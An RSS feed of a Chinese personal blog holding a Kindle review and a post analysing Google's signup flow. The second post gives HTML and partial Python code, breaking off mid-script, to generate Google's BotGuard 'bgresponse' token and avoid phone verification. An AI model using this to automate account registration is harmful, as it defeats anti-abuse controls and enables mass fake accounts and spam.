<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
        <title>dieyushi's Blog</title>
        <description>dieyushi's Blog - dieyushi</description>
        <link>http://www.zzsec.org</link>
        <link>http://www.zzsec.org</link>
        <lastBuildDate>2013-04-08T21:43:28+08:00</lastBuildDate>
        <pubDate>2013-04-08T21:43:28+08:00</pubDate>
        <ttl>1800</ttl>


        <item>
                <title>kindle的那些事</title>
                <description>&lt;h3&gt;前言&lt;/h3&gt;

&lt;p&gt;从大学以来就一直有晚上熄灯后看小说的习惯，当时寝室4个人，全是在被窝里拿着手机看。后来慢慢的听到了墨水屏，电纸书等一些概念，但是一直对这类的电子书产品持无所谓的态度。就这样用手机看小说一直看了几年，手机都换了几个了。看完的txt也有几百兆了。越来越觉着手机用来阅读只能短时间的看看，超过半个小时，眼睛就被背光刺的很不舒服。&lt;/p&gt;

&lt;h3&gt;kindle4印象&lt;/h3&gt;

&lt;p&gt;就这样，在去年11月想入手个kindle来看书。当时新一代的产品刚推出没多久，新的kindle5在这个城市里没现货，只有kindle4了，不过kindle4和5基本上没任何差别，就在淘宝js处入了个kindle4,下了订单直接去实体店自提的。&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;img src=&quot;http://dl.zzsec.org/u/79944785/Blog/Pictures/2013-04-05-02.jpg&quot; alt=&quot;kindle4&quot;&gt;&lt;br&gt;
kindle4是使用物理按键，取消了K3的全键盘，所以在使用时输入是很麻烦的，输个wifi的密码都要一分钟。K4在白天使用的是完美的，晚上没有灯光，使用读书灯的条件下，显得会有点暗，不适合黑暗中长时间阅读。正是因为这个原因，我把k4送人了。&lt;/p&gt;

&lt;h3&gt;kindle4使用&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;kindle4在默认情况下，对汉语支持有限，默认字体也不完美，通过root和改字体，可以使显示效果变得很好。具体的教程可以参见本文最后的链接。当然，K4的英文显示是不需要说的，太完美了，跟印刷品一样。&lt;/li&gt;
&lt;li&gt;这里要提醒的一点是，如果换字体过程中，配置文件里写的字体系统中没有（这就是我遇到的问题。。写配置的时候把字体离得-写成了_)，启动后就会出现菜单无法打开的情况，这是因为打开菜单时的时间已经是汉语显示的了，但是找不到汉语字体。这种情况下只能通过&lt;code&gt;MfgTool&lt;/code&gt;来进入诊断模式。具体的做法为：打开MfgTool.exe，kindle连上USB线，长按电源键，直到显示灯灭，不要松开电源键按方向键下↓，松开电源键，然后再松开方向键，这时候mfgtool界面会出现变化显示HID-compliant device，然后选择 kindle diags，单击“开始”，kindle就会自动重启进入诊断模式。重新改回正确的配置就可以了。&lt;/li&gt;
&lt;li&gt;关于多看，一直没有装多看，是觉着没有这方面的需求，换了字体后显示已经很完美了，就懒得用一个没有官方系统稳定的版本了。总的来说，如果没有夜读的需求，K4/K5会是最合适的选择。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;Kindle Paperwhite印象&lt;/h3&gt;

&lt;p&gt;寒假的时候，Kindle Paperwhite就一直在心里长草了。淘宝上的js报价太离谱了，就直接从日本亚马逊上下单，通过Jshopper转运，总共10天到手（下单到送到js2天，js处理1天，ems7天），之后Jshopper就爆仓了。
&lt;img src=&quot;http://dl.zzsec.org/u/79944785/Blog/Pictures/2013-04-05-01.jpg&quot; alt=&quot;Kindle Paperwhite&quot;&gt;&lt;br&gt;
Kindle Paperwhite日版和美版采用了一样的硬件，但是便宜很多，并且还是没有广告的版本。性价比超高。不被税的情况下最多630到手。不过目前淘宝js们已经把价格定了很便宜了，可以考虑在tb买了。&lt;br&gt;
虽然说kindle pw在分辨率，对比度方面都有提升，但是真实体验的效果并不明显。相反，在有日光的情况下，我更喜欢k4的效果。kindle pw默认是有中文支持，并且有宋体，楷体，黑体三种字体。但是总觉着kindle pw的字体显示有点淡，有点发虚，没有显示英文那么完美的效果。&lt;/p&gt;

&lt;h3&gt;Kinde Paperwhite使用&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;多看系统有阅读加黑的功能，就尝试的刷了多看系统，值得一提的是，之前刷多看必须先把kindle pw降级的5.3.1，不过amazon更新了5.3.4之后就不需要了，直接可以刷多看系统，刷完之后的确汉字显示要好点了。不过多看的英文显示和官方系统差的可不是一点半点了。&lt;/li&gt;
&lt;li&gt;电池没有感觉到很多人说的那么不耐用，读书时一直到12的亮度可以看10天没问题，和K4差别不明显。&lt;/li&gt;
&lt;li&gt;kindle只有6寸的屏幕，看pdf明显力不从心，当然可以装Koreader或者多看来弥补下，但是看pdf体验最好的还是9.7寸的屏幕。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;kindle相关的一些资源&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ikandou.com/&quot;&gt;爱看豆&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://book.zi5.me/&quot;&gt;子午书简&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.kindlemi.com/books&quot;&gt;Kindle迷&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.mlook.mobi/&quot;&gt;mLook&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.mydogear.com/&quot;&gt;狗耳朵&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://kindle4rss.com/&quot;&gt;kindle4rss&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3&gt;总结&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;如果你喜欢阅读，喜欢文字，Kindle一定不会让你失望的。&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;参考&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://miaoo.in/kindle4-modify-font.html&quot;&gt;kindle4更换字体&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://site.douban.com/150757/widget/notes/8573895/note/226703276/&quot;&gt;kindle4快捷键&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.mobileread.com/forums/showthread.php?t=198446&quot;&gt;Kindle Paperwhite Jailbreak&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://vislab.bjmu.edu.cn/blog/hwangxin/2012/10/read-scanned-pdfs-with-kindlepdfviewer/&quot;&gt;Kindle安装Koreader&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
                <link>http://www.zzsec.org/2013/04/kindle</link>
                <guid>http://www.zzsec.org/2013/04/kindle</guid>
                <pubDate>2013-04-05T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>google注册过程分析</title>
                <description>&lt;h3&gt;前言&lt;/h3&gt;

&lt;p&gt;google账户的注册页面为&lt;a href=&quot;https://accounts.google.com/NewAccount&quot;&gt;https://accounts.google.com/NewAccount&lt;/a&gt;,看了下google账户的注册机制，发现所有的POST变量都可以找到，只有&lt;code&gt;bgresponse&lt;/code&gt;不是页面中直接可以得到的。&lt;code&gt;bgresponse&lt;/code&gt;是专门验证是不是bot的。使用了google的&lt;code&gt;botguard&lt;/code&gt;技术，如果不能正确的发送这个值的话，google就会要求进行手机验证。这个值的获取方法如下。&lt;/p&gt;

&lt;!--more--&gt;

&lt;h3&gt;程序&lt;/h3&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;https://www.google.com/js/bg/JnBnYvDSdG9SCf318u50U-J5uM1u66XDgtBIu4U1f7s.js&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;botguard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;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&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;使用&lt;code&gt;pywebkitgtk&lt;/code&gt;处理，可以获取到javascript解析后的页面，方法为：&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;thread&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;gtk&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;webkit&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;warnings&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;optparse&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;warnings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filterwarnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;WebView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;webkit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WebView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
